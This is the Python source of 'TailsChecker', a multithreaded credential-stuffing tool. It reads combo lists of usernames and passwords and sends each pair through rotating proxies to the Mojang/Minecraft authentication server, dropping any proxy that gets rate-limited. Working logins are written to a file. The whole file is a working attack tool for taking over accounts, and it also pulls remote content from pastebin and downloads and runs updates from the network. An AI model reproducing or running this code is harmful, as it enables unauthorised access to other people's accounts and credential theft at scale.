from utils.colors import yellow, red, green, cyan, blue, white, magenta
from utils.csetconf import auto_start, check_updates, threads, retries, mail_access, hide_passwords, print_bad, save_bad, proxy_protocol, proxy_dupe, proxy_bad, debugging, dev_mode
from utils.mdets import autostart_config

from colorama import Fore, init, deinit, Style
from requests import Session, exceptions
from traceback import format_exc
from easygui import fileopenbox

import threading, requests, ctypes, time, os, sys, keyboard, random

class Misc:
    global mark, running, credits

    if os.path.exists('config.conf'):
        open('config.conf', 'r', errors='ignore')
    else:
        open('config.conf', 'w').write(requests.get('https://pastebin.com/raw/ermtgVyV'))

    with open('./utils/version') as f:
        version = f.readline()

    mark = f'{red}\n' + requests.get('https://pastebin.com/raw/uxJtrC3n').text + f'\n\n{red}  TailsChecker-{version} »» Created by Tails Team\n'
Misc()

class Main:
    def __init__(self):
        self.checking = True
        self.usernames = []
        self.passwords = []
        self.proxy_list = []
        self.invalid = 0
        self.counter = 0
        self.valid = 0

        # Extracted variables
        self.auto_start = auto_start
        self.check_updates = check_updates
        self.threads = threads
        self.retries = retries
        self.mail_access = mail_access
        self.hide_pwds = hide_passwords
        self.print_bad = print_bad
        self.save_bad = save_bad
        self.protocol = proxy_protocol
        self.proxy_dupe = proxy_dupe
        self.proxy_bad = proxy_bad
        self.debugging = debugging
        self.dev_mode = dev_mode

    def proxy_type(self):
        try:
            if auto_start == True:
                self.protocol = proxy_protocol
            else:
                print(mark)
                id = int(input(f"{red}> {white}Please select your proxies protocol (HTTP = 1, SOCKS4 = 2, SOCKS5 = 3 [DEFAULT]): "))
                if id == 1:
                    self.protocol = "https"
                elif id == 2:
                    self.protocol = "socks4"
                elif id == 3:
                    self.protocol = "socks5"
                if id < 1 or id > 3:
                    print(f"{yellow} ERROR {white}: Incorrect value entered, retry.")
                    exit()
        except Exception:
            self.protocol = "socks5"

    def load_proxies(self):
        print(mark)
        if os.path.exists("proxies.txt"):
            try:
                with open("proxies.txt", 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            proxyline = line.split()[0].replace("\n", "")
                            self.proxy_list.append(proxyline)
                        except:
                            pass
                print(f"> Loaded [{len(self.proxy_list)}] proxies lines..\n")

                os.system("cls")
                print(mark)
            except Exception as err:
                if self.debugging == "true":
                        print("error [1]: " + str(err))
                print(f"\nproxy error")

        else:
            os.system("cls")
            print(mark)
            print(f"{yellow}ERROR {white}: No proxy file found, please select your proxies.")
            proxies = open(fileopenbox(title="Load Proxies List", default="*.txt"), "r", encoding="UTF-8", errors="ignore").readlines()
            for line in proxies:
                try:
                    proxyline = line.split()[0].replace("\n", "")
                    self.proxy_list.append(proxyline)
                except Exception as err:
                    if self.debugging == "true":
                        print("error [2]: " + str(err))
                    pass

            print(f"{red}> {white}Loaded [{len(self.proxy_list)}] proxies lines..\n")
            os.system("cls")
            print(mark)

    def load_combos(self):
        if os.path.exists("combo.txt"):
            with open("combo.txt", "r") as f:
                for line in f.read().splitlines():
                    if ":" in line:
                        self.usernames.append(line.split(":")[0])
                        self.passwords.append(line.split(":")[-1])
            if not len(self.usernames): return None
            return True
        
        else:
            print(mark)
            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("TC | Error"); 
            print(mark)
            print(f"> {yellow}ERROR{white} : No combo file found, please select your combo.")
            combo = open(fileopenbox(title="Load Combo List", default="*.txt"), "r")
            for line in combo.readlines():
                self.usernames.append(line.split(":")[0].strip())
                self.passwords.append(line.split(":")[1].strip())
            if not len(self.usernames): return None
            os.system("cls")
            return True

    def title(self):
        ctypes.windll.kernel32.SetConsoleTitleW("TC | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid))))
       
    def session(self):
        session = requests.Session()
        session.trust_env = False
        return session

    
    def check_account(self, username, password):
        try:
            proxy = random.choice(self.proxy_list)
            if self.protocol == "https":
                try:
                    if proxy.split(":")[3]:
                        port = proxy.split(":")
                        if port[1].isnumeric():
                            proxy_table = {"http": "http://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1], "https": "https://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1]}
                        elif port[3].isnumeric():
                            proxy_table = {"http": "http://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3], "https": "https://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3]}
                except Exception:
                    proxy_table = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
            else:
                try:
                    if proxy.split(":")[3]:
                        port = proxy.split(":")
                        if port[1].isnumeric():
                            proxy_table = {"http": self.protocol + "://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1], "https": self.protocol + "://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1]}
                        elif port[3].isnumeric():
                            proxy_table = {"http": self.protocol + "://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3], "https": self.protocol + "://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3]}
                except Exception:
                    proxy_table = {"http": f"{self.protocol}://{proxy}", "https": f"{self.protocol}://{proxy}"}
                try:
                    session = self.session()

                    json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
                    check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = proxy_table)

                    if "accessToken" in check.json():
                        if self.hide_pwds == True:
                            print(f'{green}[Good] {white}{username}:{red}********')
                        else:
                            print(f'{green}[Good] {white}{username}:{password}')
                    elif "error" in check.json():
                        if self.hide_pwds == True:
                            print(f'{red}[Bad] {white}{username}:{red}********')
                        else: 
                            print(f'{red}[Bad] {white}{username}:{password}')


                    elif "The request could not be satisfied." in check.content:
                        print(f'{yellow}[Rate Limited] {white}the request could not be satisfied, removing proxy.')
                        self.proxy_list.remove(proxy)
                            
                    if "clientToken" in check.text:
                        with open("valid.txt", "a") as f: f.write(f'{username}:{password}')
                        self.valid += 1
                        self.title()
                    else:
                        self.invalid += 1
                        self.title()
                except Exception as err:
                    if self.debugging == "true":
                        print("error [3]: " + str(err))
                    if "No connection could be made because the target machine actively refused it" in str(err):
                        self.proxy_list.remove(proxy)
                        proxyhid = f'{proxy.split(":")[0]}:{proxy.split(":")[1]}:{red}**********{white}:{red}**********'
                        # print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
                        if self.hide_pwds == True:
                            print(f'{red}[Invalid Proxy] {yellow}removing {white}=> {proxyhid}')
                        else:
                            print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
        except Exception as err:
            if self.debugging == "true":
                print("error [4]: " + str(err))

    def start_checking(self):
        def thread_starter():
            self.check_account(self.usernames[self.counter], self.passwords[self.counter])

        while True:
            if threading.active_count() <= self.threads:
                threading.Thread(target = thread_starter).start()
                self.counter += 1
                            
            if self.counter >= len(self.usernames): break
        input()

    def start(self):
        os.system("cls")
        self.proxy_type()
        self.load_proxies()
        self.start_checking()

    def updating(self):
        os.system("cls")
        print(mark)
        print(f'{cyan}[INFO]{white} Checking for updates...', end = "")
        def spinning_cursor():
            while True:
                for cursor in '|/-\\':
                    yield cursor

        spinner = spinning_cursor()    
        for _ in range(10):
            sys.stdout.write(next(spinner))
            sys.stdout.flush()
            time.sleep(0.1)
            sys.stdout.write('\b')
        print()

        r = requests.get("https://raw.githubusercontent.com/Kitsunake/TailsChecker/main/tails.py", allow_redirects=True)
        githubVersion = requests.get("https://raw.githubusercontent.com/Kitsunake/TailsChecker/main/utils/version")
        if Misc.version not in githubVersion.text:
            print(f'{cyan}[UPDATE]{white}: An update is available!')
            userInput = input(f'{cyan}[INFO]{white} Do you want to continue? (y/n)\n> ');
            if userInput.lower() == 'y':
                os.system("cls")
                print(mark)
                print(f'{cyan}[INFO]{white} Downloading TailsChecker '+githubVersion.text.replace("\n","")+' from https://github.com/Kitsunake/TailsChecker/blob/main/tails.py...', end = "")

                spinner = spinning_cursor()
                for _ in range(10):
                    sys.stdout.write(next(spinner))
                    sys.stdout.flush()
                    time.sleep(0.1)
                    sys.stdout.write('\b')
                print()
                
                open('tails_new', 'wb').write(r.content)
                print(f'{cyan}[INFO]{white} Downloaded new TailsChecker')
                os.system('python update.py')
                time.sleep(3)
                exit()
            else:
                os.system("cls")
        else:
            print(f'{green}[OK]{white} You are running on the latest version.')
            time.sleep(1)
            os.system("cls")
    
    def as_print(self):
        print(f'{yellow}[Auto Start]{white} Starting in a moment..', end="")
        def spinning_cursor():
            while True:
                for cursor in '|/-\\':
                    yield cursor

        spinner = spinning_cursor()
        for _ in range(50):
            sys.stdout.write(next(spinner))
            sys.stdout.flush()
            time.sleep(0.1)
            sys.stdout.write('\b')
        print()

    def main(self):
        if check_updates == True:
            self.updating()
        else:
            init()
            print(mark)
            print(f'{red}> [Disabled]{yellow} Auto updating, proceeding...')
            deinit()
            time.sleep(0.6)
            os.system("cls")



        load_combo = self.load_combos()
        if load_combo is not None:
            if auto_start == True:
                print(mark)
                self.retries = int(retries)
                self.threads = int(threads)
                print(autostart_config + '\n')
                self.as_print()
                time.sleep(1)
                os.system("cls")
                self.start()

            print(mark)
            self.threads = int(input(f"{red}> {white}Threads: "))
            os.system("cls")
            print(mark)
            try:
                passwords = int(input(f"{red}> {white}Hide passwords (default: 0 = no, 1 = yes): "))
                if passwords == 1:
                    self.hide_pwds = True
                else:
                    self.hide_pwds = False
            except Exception:
                passwords = 0

            os.system("cls")
            print(mark)
            try:
                self.retries = int(input(f"{red}> {white}Retries (default: 0, 3 max): "))
                if self.retries == 0:
                    self.retries = 1
                    self.start()
                elif self.retries > 3 or self.retries < 1:
                    retries_old = self.retries
                    self.retries = 1
                    print(f"{red}Unexpected value {retries_old}, new value {self.retries}")
                    self.start()
            except Exception:
                self.retries = 1
                self.start()
        else:
            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("TC | Error"); 
            print(f"\n{yellow}ERROR{white} : Combos could not be loaded."); time.sleep(10); 
            exit()

Main().main()
